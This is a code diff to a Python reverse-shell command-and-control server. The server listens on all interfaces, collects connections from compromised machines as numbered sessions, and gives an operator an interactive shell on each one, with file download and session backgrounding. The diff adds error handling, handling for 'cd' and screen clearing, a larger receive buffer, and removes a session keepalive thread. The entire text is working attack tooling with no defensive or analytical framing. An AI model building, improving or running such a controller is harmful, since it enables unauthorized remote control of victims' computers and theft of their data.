@@ -47,13 +47,14 @@ def die():
 
 def run_server():
     global alive
+    host = "0.0.0.0"
+    port = <<PORT>>
+    print(f'[+] Listening for income TCP connection on port {port}...\n')
     while alive:
         s = socket.socket()
-        host = "0.0.0.0"
-        port = <<PORT>>
+        
         s.bind((host, port))
         s.listen(10)
-        print(f'[+] Listening for income TCP connection on port {port}...\n')
         try:
             client, addr = s.accept()
             num = len(sessions)
@@ -86,23 +87,36 @@ def handle_client():
                     print("error", e)
             if 'interact' in com:
                 comm, snum = com.split("::")
-                conn = sessions[int(snum)][1]
+                try:
+                    conn = sessions[int(snum)][1]
+                except:
+                    print("make sure you did it right")
+                    continue
                 while True:
                     try:
                         command = input(f"[{snum}] Shell>")
                         if '<terminate' in command:
                             sessions.pop(int(snum))
                             break
-                        elif command.lower() in BACKGROUND:
+                        elif command == 'cls' or command == 'clear':
+                            os.system('cls')
+                            continue
+                        elif command == "<bg" or command == "<background":
                             print(f"Backgrounded: {snum}")
                             break
-                        elif '<download in command:
+                        elif '<download' in command:
                             transfer(conn, command)
                         elif command.strip() == "":
                             continue
+                        elif 'cd ' in command[:2]:
+                            conn.send(command.encode())
+                            print("sent")
+                            continue
                         else:
                             conn.send(command.encode())
-                            print(conn.recv(1024).decode())
+                            print(conn.recv(2048).decode())
+                    except WindowsError:
+                        break
                     except Exception as err:
                         print(f"Inside Error: [{err}]")
         except (KeyboardInterrupt, EOFError):
@@ -112,23 +126,23 @@ def handle_client():
 
 
 
-def timeout():
-    global sessions
-    while alive:
-        time.sleep(10)
-        com = "pwd"
-
-        for x in sessions:
-            try:
-                conn = x[1]
-                conn.send(com.encode())
-                resp = conn.recv(1024).decode()
-                if len(resp) > 0:
-                    continue
-                else:
-                    sessions.pop(x[0])
-            except Exception as e:
-                print(e)
+#def timeout():
+#    global sessions
+#    while alive:
+#        time.sleep(10)
+#        com = "pwd"
+#
+#        for x in sessions:
+#            try:
+#                conn = x[1]
+#                conn.send(com.encode())
+#                resp = conn.recv(1024).decode()
+#                if len(resp) > 0:
+#                    continue
+#                else:
+#                    sessions.pop(x[0])
+#            except Exception as e:
+#                print(e)
                 #sessions.pop(x[0])
 
 
@@ -157,7 +171,7 @@ if __name__ == "__main__":
 
     run_server_thread = Thread(target=run_server)
     print_conn_thread = Thread(target=print_conn)
-    control_timeout = Thread(target=timeout)
+    #control_timeout = Thread(target=timeout)
     main_server_thread = Thread(target=handle_client)
 
     run_server_thread.daemon = True
@@ -165,7 +179,7 @@ if __name__ == "__main__":
 
     queue.append(run_server_thread)
     queue.append(print_conn_thread)
-    queue.append(control_timeout)
+    #queue.append(control_timeout)
     queue.append(main_server_thread)
 
     run_alive(queue)
